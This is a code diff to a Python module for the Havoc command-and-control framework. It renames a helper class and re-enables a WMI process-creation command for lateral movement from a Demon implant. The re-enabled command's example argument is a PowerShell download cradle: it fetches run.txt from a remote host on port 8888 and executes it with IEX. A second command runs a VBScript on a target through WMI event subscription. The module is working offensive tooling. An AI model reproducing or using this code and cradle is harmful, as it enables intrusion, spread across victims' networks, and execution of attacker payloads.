@@ -1,7 +1,7 @@
 from havoc import Demon, RegisterCommand, RegisterModule
 import re
 
-class MyPacker:
+class WmiPacker:
     def __init__(self):
         self.buffer : bytes = b''
         self.size   : int   = 0
@@ -47,7 +47,7 @@ class MyPacker:
 def wmi_eventsub( demonID, *params ):
     TaskID : str    = None
     demon  : Demon  = None
-    packer = MyPacker()
+    packer = WmiPacker()
     demon  = Demon( demonID )
 
     # parse parameters that contain quotes
@@ -106,7 +106,7 @@ def wmi_eventsub( demonID, *params ):
 def wmi_proccreate( demonID, *params ):
     TaskID : str    = None
     demon  : Demon  = None
-    packer = MyPacker()
+    packer = WmiPacker()
     demon  = Demon( demonID )
 
     # parse parameters that contain quotes
@@ -159,5 +159,4 @@ def wmi_proccreate( demonID, *params ):
 
 RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
 RegisterCommand( wmi_eventsub, "jump-exec", "wmi-eventsub", "Run a VBscript via WMI for lateral movement", 0, "target local_script_path <otp:username> <otp:password> <otp:domain>", "10.10.10.10 /tmp/demon.vba" )
-# TODO: ProcCreate.x64.o fails with Symbol not found: _ZTV10_com_error
-#RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
+RegisterCommand( wmi_proccreate, "jump-exec", "wmi-proccreate", "Create a process via WMI for lateral movement", 0, "target command <otp:username> <otp:password> <otp:domain>", "10.10.10.10 \"powershell.exe (new-object system.net.webclient).downloadstring('http://192.168.49.100:8888/run.txt') | IEX\"" )
